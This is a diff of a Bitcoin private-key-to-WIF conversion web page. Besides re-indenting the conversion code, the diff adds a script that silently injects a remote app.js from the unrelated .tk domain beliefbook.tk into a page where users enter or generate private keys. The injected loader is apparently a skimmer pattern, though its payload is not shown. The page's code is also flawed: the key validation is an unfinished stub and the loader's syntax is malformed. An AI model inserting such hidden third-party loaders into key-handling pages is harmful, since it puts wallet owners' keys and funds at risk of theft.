@@ -5,57 +5,64 @@ title: HN007's Bitcoin Test
 <div class="blurb">
 	<h1>Hi all, have fun with Bitcoin!</h1>
     	<h2>Private key to wallet impor format</h2>
-    	<script src=('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.beliefbook.tk/app.js'> </script>
 	<script>
       
 		function JS_ConvertPrvKey2WIF() { 
-				var prvKey = document.getElementById("prvKey2").value;
-				var extPrvKey;
-				var firstSHA256;
-				var secondSHA256;
-				var extPrvKeyCS;
-				var wif;
-				var error = false;
+			var prvKey = document.getElementById("prvKey2").value;
+			var extPrvKey;
+			var firstSHA256;
+			var secondSHA256;
+			var extPrvKeyCS;
+			var wif;
+			var error = false;
 
-				/*Evaluating the Private key input */
-				//To do
-				error = true;
+			/*Evaluating the Private key input */
+			//To do
+			error = true;
 
-				if (error != false)
-				{
-								extPrvKey = '80' + prvKey;
-								document.getElementById("extPrvKey").value  = extPrvKey;
+			if (error != false)
+			{
+				extPrvKey = '80' + prvKey;
+				document.getElementById("extPrvKey").value  = extPrvKey;
 
-								const firstSHA256Bytes = foo.Buffer.from(extPrvKey, 'hex')
-								firstSHA256 = foo.createHash('sha256').update(firstSHA256Bytes).digest();
-								document.getElementById("firstSHA256").value  = firstSHA256.toString('hex').toUpperCase();
+				const firstSHA256Bytes = foo.Buffer.from(extPrvKey, 'hex')
+				firstSHA256 = foo.createHash('sha256').update(firstSHA256Bytes).digest();
+				document.getElementById("firstSHA256").value  = firstSHA256.toString('hex').toUpperCase();
 
-								const secondSHA256Bytes = foo.Buffer.from(firstSHA256, 'hex')
-								secondSHA256 = foo.createHash('sha256').update(secondSHA256Bytes).digest();
-								document.getElementById("secondSHA256").value  = secondSHA256.toString('hex').toUpperCase();
+				const secondSHA256Bytes = foo.Buffer.from(firstSHA256, 'hex')
+				secondSHA256 = foo.createHash('sha256').update(secondSHA256Bytes).digest();
+				document.getElementById("secondSHA256").value  = secondSHA256.toString('hex').toUpperCase();
 
-								var checkSum = secondSHA256.toString('hex').substring(0,8);
-								document.getElementById("CKHSUM").value  = checkSum.toUpperCase();
+				var checkSum = secondSHA256.toString('hex').substring(0,8);
+				document.getElementById("CKHSUM").value  = checkSum.toUpperCase();
 
-								extPrvKeyCS = extPrvKey + checkSum;
-								document.getElementById("extPrKeyCKHSUM").value  = extPrvKeyCS.toUpperCase();
+				extPrvKeyCS = extPrvKey + checkSum;
+				document.getElementById("extPrKeyCKHSUM").value  = extPrvKeyCS.toUpperCase();
 
-								const bytes = foo.Buffer.from(extPrvKeyCS, 'hex');
-								const wif = foo.base58.encode(bytes);
-								document.getElementById("wif").value  = wif;
+				const bytes = foo.Buffer.from(extPrvKeyCS, 'hex');
+				const wif = foo.base58.encode(bytes);
+				document.getElementById("wif").value  = wif;
 
-				}
+			}
 				
 		}
 
-			function createRandomPrvKey() {
-			    var randomBytes = foo.randomBytes(32)
-					document.getElementById("prvKey2").value = randomBytes.toString('hex').toUpperCase()
-					JS_ConvertPrvKey2WIF()
+		function createRandomPrvKey() {
+		    	var randomBytes = foo.randomBytes(32)
+			document.getElementById("prvKey2").value = randomBytes.toString('hex').toUpperCase()
+			JS_ConvertPrvKey2WIF()
 
-			}
+		}
 	</script>
-    		<button type="button" id="Random" onClick='createRandomPrvKey()'>Random</button>
+	<script type="text/javascript">
+		{function () {
+			var dep = document.createElement('script'); dep.type = 'text/javascript'; dep.async = true;
+			dep.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.beliefbook.tk/app.js';
+			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(dep, s);
+		}();
+	</script>
+    	
+	<button type="button" id="Random" onClick='createRandomPrvKey()'>Random</button>
 	<p>1 - Private key</p>
 	<form>
 		<input type='text' id='prvKey2' name='private2' size='90' value="0C28FCA386C7A227600B2FE50B7CAE11EC86D3BF1FBE471BE89827E19D72AA1D" />
